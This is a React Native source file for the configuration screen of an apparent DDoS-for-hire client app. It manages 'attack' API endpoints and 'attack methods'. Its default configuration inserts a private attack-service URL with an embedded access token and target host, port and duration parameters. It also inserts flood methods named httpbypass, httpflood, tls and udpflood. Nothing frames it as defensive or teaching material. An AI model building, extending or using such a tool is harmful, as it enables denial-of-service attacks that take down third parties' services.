import React, { useState, useEffect } from 'react';
import {
  View,
  Text,
  TextInput,
  TouchableOpacity,
  StyleSheet,
  ScrollView,
  Alert,
  Modal,
  FlatList,
} from 'react-native';
import { Ionicons } from '@expo/vector-icons';
import AsyncStorage from '@react-native-async-storage/async-storage';

interface APIConfig {
  id: string;
  name: string;
  url: string;
}

interface Method {
  id: string;
  name: string;
  apiId: string;
}

export default function ConfigScreen() {
  const [apis, setApis] = useState<APIConfig[]>([]);
  const [methods, setMethods] = useState<Method[]>([]);
  const [maxTime, setMaxTime] = useState('300');
  const [showAddAPI, setShowAddAPI] = useState(false);
  const [showAddMethod, setShowAddMethod] = useState(false);
  const [showLinkModal, setShowLinkModal] = useState(false);
  const [selectedMethodForLink, setSelectedMethodForLink] = useState<Method | null>(null);

  const [apiName, setApiName] = useState('');
  const [apiUrl, setApiUrl] = useState('');
  const [methodName, setMethodName] = useState('');
  const [selectedApiId, setSelectedApiId] = useState('');

  useEffect(() => {
    loadData();
  }, []);

  const loadData = async () => {
    try {
      const [apisData, methodsData, settingsData] = await Promise.all([
        AsyncStorage.getItem('apis'),
        AsyncStorage.getItem('methods'),
        AsyncStorage.getItem('settings'),
      ]);

      if (apisData) setApis(JSON.parse(apisData));
      if (methodsData) setMethods(JSON.parse(methodsData));
      if (settingsData) {
        const settings = JSON.parse(settingsData);
        setMaxTime(settings.maxTimeAllowed?.toString() || '300');
      }
    } catch (error) {
      console.error('Error loading data:', error);
    }
  };

  const addAPI = async () => {
    if (!apiName || !apiUrl) {
      Alert.alert('Error', 'Please fill all required fields');
      return;
    }

    try {
      const newApi: APIConfig = {
        id: Date.now().toString(),
        name: apiName,
        url: apiUrl,
      };

      const updatedApis = [...apis, newApi];
      await AsyncStorage.setItem('apis', JSON.stringify(updatedApis));
      setApis(updatedApis);

      setApiName('');
      setApiUrl('');
      setShowAddAPI(false);
      Alert.alert('Success', 'API added successfully');
    } catch (error) {
      Alert.alert('Error', 'Failed to add API');
    }
  };

  const deleteAPI = async (id: string) => {
    Alert.alert('Confirm', 'Delete this API?', [
      { text: 'Cancel', style: 'cancel' },
      {
        text: 'Delete',
        style: 'destructive',
        onPress: async () => {
          try {
            const updatedApis = apis.filter((api) => api.id !== id);
            await AsyncStorage.setItem('apis', JSON.stringify(updatedApis));
            setApis(updatedApis);
          } catch (error) {
            Alert.alert('Error', 'Failed to delete API');
          }
        },
      },
    ]);
  };

  const addMethod = async () => {
    if (!methodName) {
      Alert.alert('Error', 'Please enter a method name');
      return;
    }

    if (apis.length === 0) {
      Alert.alert('Error', 'Add at least one API first');
      return;
    }

    try {
      const newMethod: Method = {
        id: Date.now().toString(),
        name: methodName,
        apiId: apis[0].id,
      };

      const updatedMethods = [...methods, newMethod];
      await AsyncStorage.setItem('methods', JSON.stringify(updatedMethods));
      setMethods(updatedMethods);

      setMethodName('');
      setShowAddMethod(false);
      Alert.alert('Success', 'Method added successfully');
    } catch (error) {
      Alert.alert('Error', 'Failed to add method');
    }
  };

  const deleteMethod = async (id: string) => {
    Alert.alert('Confirm', 'Delete this method?', [
      { text: 'Cancel', style: 'cancel' },
      {
        text: 'Delete',
        style: 'destructive',
        onPress: async () => {
          try {
            const updatedMethods = methods.filter((method) => method.id !== id);
            await AsyncStorage.setItem('methods', JSON.stringify(updatedMethods));
            setMethods(updatedMethods);
          } catch (error) {
            Alert.alert('Error', 'Failed to delete method');
          }
        },
      },
    ]);
  };

  const openLinkModal = (method: Method) => {
    setSelectedMethodForLink(method);
    setSelectedApiId(method.apiId);
    setShowLinkModal(true);
  };

  const linkApiToMethod = async () => {
    if (!selectedMethodForLink || !selectedApiId) return;

    try {
      const updatedMethods = methods.map((m) =>
        m.id === selectedMethodForLink.id ? { ...m, apiId: selectedApiId } : m
      );

      await AsyncStorage.setItem('methods', JSON.stringify(updatedMethods));
      setMethods(updatedMethods);

      setShowLinkModal(false);
      setSelectedMethodForLink(null);
      setSelectedApiId('');
      Alert.alert('Success', 'API linked successfully');
    } catch (error) {
      Alert.alert('Error', 'Failed to link API');
    }
  };

  const updateMaxTime = async () => {
    try {
      const settings = { maxTimeAllowed: parseInt(maxTime) };
      await AsyncStorage.setItem('settings', JSON.stringify(settings));
      Alert.alert('Success', 'Settings updated');
    } catch (error) {
      Alert.alert('Error', 'Failed to update settings');
    }
  };

  const initializeDefaultData = async () => {
    Alert.alert(
      'Load Defaults',
      'Load default configuration? This will add sample APIs and methods.',
      [
        { text: 'Cancel', style: 'cancel' },
        {
          text: 'Load',
          onPress: async () => {
            try {
              const defaultApi: APIConfig = {
                id: 'default-l7-api',
                name: 'Default L7 API',
                url: 'https://api.l7srv.su/private/attack?token=SbesnilX8ololuZV8Jvo0k&host=[host]&port=[port]&time=[time]&method=[method]&concs=5',
              };

              const defaultMethods: Method[] = [
                { id: 'method-1', name: 'httpbypass', apiId: 'default-l7-api' },
                { id: 'method-2', name: 'httpflood', apiId: 'default-l7-api' },
                { id: 'method-3', name: 'tls', apiId: 'default-l7-api' },
                { id: 'method-4', name: 'udpflood', apiId: 'default-l7-api' },
              ];

              await AsyncStorage.setItem('apis', JSON.stringify([defaultApi]));
              await AsyncStorage.setItem('methods', JSON.stringify(defaultMethods));

              loadData();
              Alert.alert('Success', 'Default configuration loaded');
            } catch (error) {
              Alert.alert('Error', 'Failed to initialize configuration');
            }
          },
        },
      ]
    );
  };

  const getApiName = (apiId: string) => {
    const api = apis.find((a) => a.id === apiId);
    return api ? api.name : 'Not linked';
  };

  return (
    <ScrollView style={styles.container} contentContainerStyle={styles.content}>
      {/* Header */}
      <View style={styles.header}>
        <Ionicons name="construct" size={32} color="#00ff9d" />
        <Text style={styles.headerTitle}>CONFIGURATION</Text>
      </View>

      {/* Initialize Button */}
      {apis.length === 0 && methods.length === 0 && (
        <TouchableOpacity style={styles.initButton} onPress={initializeDefaultData}>
          <Ionicons name="download" size={20} color="#000" />
          <Text style={styles.initButtonText}>Load Default Config</Text>
        </TouchableOpacity>
      )}

      {/* APIs Section */}
      <View style={styles.section}>
        <View style={styles.sectionHeader}>
          <View style={styles.headerLeft}>
            <Ionicons name="cloud" size={20} color="#00ff9d" />
            <Text style={styles.sectionTitle}>API Endpoints</Text>
          </View>
          <TouchableOpacity
            style={styles.addButton}
            onPress={() => setShowAddAPI(true)}
          >
            <Ionicons name="add-circle" size={28} color="#00ff9d" />
          </TouchableOpacity>
        </View>

        {apis.map((api) => (
          <View key={api.id} style={styles.card}>
            <View style={styles.cardContent}>
              <View style={styles.cardHeader}>
                <Ionicons name="server" size={18} color="#00ff9d" />
                <Text style={styles.cardTitle}>{api.name}</Text>
              </View>
              <Text style={styles.cardSubtitle} numberOfLines={2}>
                {api.url}
              </Text>
            </View>
            <TouchableOpacity onPress={() => deleteAPI(api.id)} style={styles.deleteButton}>
              <Ionicons name="trash" size={20} color="#ff3366" />
            </TouchableOpacity>
          </View>
        ))}

        {apis.length === 0 && (
          <View style={styles.emptyBox}>
            <Ionicons name="cloud-offline" size={40} color="#4a5568" />
            <Text style={styles.emptyText}>No APIs configured</Text>
          </View>
        )}
      </View>

      {/* Methods Section */}
      <View style={styles.section}>
        <View style={styles.sectionHeader}>
          <View style={styles.headerLeft}>
            <Ionicons name="flash" size={20} color="#ff3366" />
            <Text style={styles.sectionTitle}>Attack Methods</Text>
          </View>
          <TouchableOpacity
            style={styles.addButton}
            onPress={() => setShowAddMethod(true)}
          >
            <Ionicons name="add-circle" size={28} color="#ff3366" />
          </TouchableOpacity>
        </View>

        {methods.map((method) => (
          <View key={method.id} style={styles.card}>
            <View style={styles.cardContent}>
              <View style={styles.cardHeader}>
                <Ionicons name="nuclear" size={18} color="#ff3366" />
                <Text style={styles.cardTitle}>{method.name}</Text>
              </View>
              <Text style={styles.cardSubtitle}>
                API: {getApiName(method.apiId)}
              </Text>
            </View>
            <View style={styles.cardActions}>
              <TouchableOpacity
                style={styles.linkButton}
                onPress={() => openLinkModal(method)}
              >
                <Ionicons name="link" size={20} color="#00ff9d" />
              </TouchableOpacity>
              <TouchableOpacity onPress={() => deleteMethod(method.id)} style={styles.deleteButton}>
                <Ionicons name="trash" size={20} color="#ff3366" />
              </TouchableOpacity>
            </View>
          </View>
        ))}

        {methods.length === 0 && (
          <View style={styles.emptyBox}>
            <Ionicons name="hammer" size={40} color="#4a5568" />
            <Text style={styles.emptyText}>No methods configured</Text>
          </View>
        )}
      </View>

      {/* Settings Section */}
      <View style={styles.section}>
        <View style={styles.sectionHeader}>
          <View style={styles.headerLeft}>
            <Ionicons name="settings" size={20} color="#fbbf24" />
            <Text style={styles.sectionTitle}>Settings</Text>
          </View>
        </View>

        <View style={styles.settingCard}>
          <View style={styles.labelRow}>
            <Ionicons name="time" size={14} color="#8b92a8" />
            <Text style={styles.label}>Max Time Allowed (seconds)</Text>
          </View>
          <TextInput
            style={styles.input}
            value={maxTime}
            onChangeText={setMaxTime}
            keyboardType="numeric"
            placeholder="300"
            placeholderTextColor="#4a5568"
          />
          <TouchableOpacity style={styles.saveButton} onPress={updateMaxTime}>
            <Ionicons name="checkmark-circle" size={20} color="#000" />
            <Text style={styles.saveButtonText}>Save Settings</Text>
          </TouchableOpacity>
        </View>
      </View>

      {/* Modals */}
      <Modal visible={showAddAPI} animationType="slide" transparent>
        <View style={styles.modalOverlay}>
          <View style={styles.modalContent}>
            <View style={styles.modalHeader}>
              <Text style={styles.modalTitle}>Add New API</Text>
              <TouchableOpacity onPress={() => setShowAddAPI(false)}>
                <Ionicons name="close-circle" size={28} color="#00ff9d" />
              </TouchableOpacity>
            </View>

            <Text style={styles.label}>API Name</Text>
            <TextInput
              style={styles.input}
              value={apiName}
              onChangeText={setApiName}
              placeholder="My Attack API"
              placeholderTextColor="#4a5568"
            />

            <Text style={styles.label}>API URL</Text>
            <TextInput
              style={[styles.input, styles.textArea]}
              value={apiUrl}
              onChangeText={setApiUrl}
              placeholder="https://api.example.com/attack?host=[host]&port=[port]&time=[time]&method=[method]"
              placeholderTextColor="#4a5568"
              multiline
            />

            <TouchableOpacity style={styles.modalButton} onPress={addAPI}>
              <Text style={styles.modalButtonText}>Add API</Text>
            </TouchableOpacity>
          </View>
        </View>
      </Modal>

      <Modal visible={showAddMethod} animationType="slide" transparent>
        <View style={styles.modalOverlay}>
          <View style={styles.modalContent}>
            <View style={styles.modalHeader}>
              <Text style={styles.modalTitle}>Add New Method</Text>
              <TouchableOpacity onPress={() => setShowAddMethod(false)}>
                <Ionicons name="close-circle" size={28} color="#ff3366" />
              </TouchableOpacity>
            </View>

            <Text style={styles.label}>Method Name</Text>
            <TextInput
              style={styles.input}
              value={methodName}
              onChangeText={setMethodName}
              placeholder="httpbypass, udpflood, etc."
              placeholderTextColor="#4a5568"
            />

            <TouchableOpacity style={styles.modalButton} onPress={addMethod}>
              <Text style={styles.modalButtonText}>Add Method</Text>
            </TouchableOpacity>
          </View>
        </View>
      </Modal>

      <Modal visible={showLinkModal} animationType="slide" transparent>
        <View style={styles.modalOverlay}>
          <View style={styles.modalContent}>
            <View style={styles.modalHeader}>
              <Text style={styles.modalTitle}>
                Link API to {selectedMethodForLink?.name}
              </Text>
              <TouchableOpacity
                onPress={() => {
                  setShowLinkModal(false);
                  setSelectedMethodForLink(null);
                  setSelectedApiId('');
                }}
              >
                <Ionicons name="close-circle" size={28} color="#00ff9d" />
              </TouchableOpacity>
            </View>

            <FlatList
              data={apis}
              keyExtractor={(item) => item.id}
              renderItem={({ item }) => (
                <TouchableOpacity
                  style={[
                    styles.apiItem,
                    selectedApiId === item.id && styles.apiItemSelected,
                  ]}
                  onPress={() => setSelectedApiId(item.id)}
                >
                  <View style={styles.checkbox}>
                    {selectedApiId === item.id && (
                      <Ionicons name="checkmark" size={18} color="#00ff9d" />
                    )}
                  </View>
                  <Text style={styles.apiItemText}>{item.name}</Text>
                </TouchableOpacity>
              )}
            />

            <TouchableOpacity
              style={styles.modalButton}
              onPress={linkApiToMethod}
            >
              <Text style={styles.modalButtonText}>Link API</Text>
            </TouchableOpacity>
          </View>
        </View>
      </Modal>
    </ScrollView>
  );
}

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: '#0a0e1a',
  },
  content: {
    padding: 16,
  },
  header: {
    alignItems: 'center',
    paddingVertical: 24,
    marginBottom: 16,
  },
  headerTitle: {
    fontSize: 24,
    fontWeight: 'bold',
    color: '#00ff9d',
    marginTop: 8,
    letterSpacing: 2,
  },
  initButton: {
    backgroundColor: '#00ff9d',
    flexDirection: 'row',
    alignItems: 'center',
    justifyContent: 'center',
    padding: 16,
    borderRadius: 12,
    marginBottom: 24,
    gap: 10,
  },
  initButtonText: {
    color: '#000',
    fontSize: 14,
    fontWeight: 'bold',
    textTransform: 'uppercase',
    letterSpacing: 1,
  },
  section: {
    marginBottom: 24,
  },
  sectionHeader: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    alignItems: 'center',
    marginBottom: 12,
  },
  headerLeft: {
    flexDirection: 'row',
    alignItems: 'center',
    gap: 8,
  },
  sectionTitle: {
    fontSize: 16,
    fontWeight: '700',
    color: '#e5e7eb',
    textTransform: 'uppercase',
    letterSpacing: 1,
  },
  addButton: {
    padding: 4,
  },
  card: {
    backgroundColor: '#151b2e',
    borderRadius: 12,
    padding: 16,
    marginBottom: 8,
    flexDirection: 'row',
    alignItems: 'center',
    borderWidth: 1,
    borderColor: '#1f2937',
  },
  cardContent: {
    flex: 1,
  },
  cardHeader: {
    flexDirection: 'row',
    alignItems: 'center',
    gap: 8,
    marginBottom: 6,
  },
  cardTitle: {
    fontSize: 15,
    fontWeight: '600',
    color: '#fff',
  },
  cardSubtitle: {
    fontSize: 12,
    color: '#8b92a8',
  },
  cardActions: {
    flexDirection: 'row',
    gap: 12,
  },
  linkButton: {
    padding: 4,
  },
  deleteButton: {
    padding: 4,
  },
  emptyBox: {
    alignItems: 'center',
    padding: 32,
    backgroundColor: '#151b2e',
    borderRadius: 12,
    borderWidth: 1,
    borderColor: '#1f2937',
  },
  emptyText: {
    color: '#8b92a8',
    fontSize: 14,
    marginTop: 8,
  },
  settingCard: {
    backgroundColor: '#151b2e',
    borderRadius: 12,
    padding: 16,
    borderWidth: 1,
    borderColor: '#1f2937',
  },
  label: {
    color: '#8b92a8',
    fontSize: 13,
    fontWeight: '600',
    marginBottom: 8,
    textTransform: 'uppercase',
    letterSpacing: 0.5,
  },
  labelRow: {
    flexDirection: 'row',
    alignItems: 'center',
    gap: 6,
    marginBottom: 8,
  },
  input: {
    backgroundColor: '#0a0e1a',
    borderWidth: 1,
    borderColor: '#1f2937',
    borderRadius: 10,
    padding: 14,
    color: '#fff',
    fontSize: 15,
    marginBottom: 12,
  },
  textArea: {
    minHeight: 80,
    textAlignVertical: 'top',
  },
  saveButton: {
    backgroundColor: '#00ff9d',
    flexDirection: 'row',
    alignItems: 'center',
    justifyContent: 'center',
    padding: 14,
    borderRadius: 10,
    gap: 8,
  },
  saveButtonText: {
    color: '#000',
    fontSize: 14,
    fontWeight: '700',
    textTransform: 'uppercase',
    letterSpacing: 1,
  },
  modalOverlay: {
    flex: 1,
    backgroundColor: 'rgba(0, 0, 0, 0.85)',
    justifyContent: 'flex-end',
  },
  modalContent: {
    backgroundColor: '#151b2e',
    borderTopLeftRadius: 24,
    borderTopRightRadius: 24,
    padding: 24,
    maxHeight: '80%',
    borderTopWidth: 2,
    borderColor: '#00ff9d',
  },
  modalHeader: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    alignItems: 'center',
    marginBottom: 20,
  },
  modalTitle: {
    fontSize: 16,
    fontWeight: 'bold',
    color: '#fff',
    textTransform: 'uppercase',
    letterSpacing: 1,
  },
  modalButton: {
    backgroundColor: '#00ff9d',
    padding: 16,
    borderRadius: 10,
    alignItems: 'center',
    marginTop: 8,
  },
  modalButtonText: {
    color: '#000',
    fontSize: 14,
    fontWeight: 'bold',
    textTransform: 'uppercase',
    letterSpacing: 1,
  },
  apiItem: {
    flexDirection: 'row',
    alignItems: 'center',
    padding: 12,
    backgroundColor: '#0a0e1a',
    borderRadius: 10,
    marginBottom: 8,
    borderWidth: 1,
    borderColor: '#1f2937',
  },
  apiItemSelected: {
    borderColor: '#00ff9d',
    backgroundColor: 'rgba(0, 255, 157, 0.1)',
  },
  checkbox: {
    width: 24,
    height: 24,
    borderRadius: 6,
    borderWidth: 2,
    borderColor: '#00ff9d',
    marginRight: 12,
    alignItems: 'center',
    justifyContent: 'center',
  },
  apiItemText: {
    color: '#fff',
    fontSize: 15,
  },
});
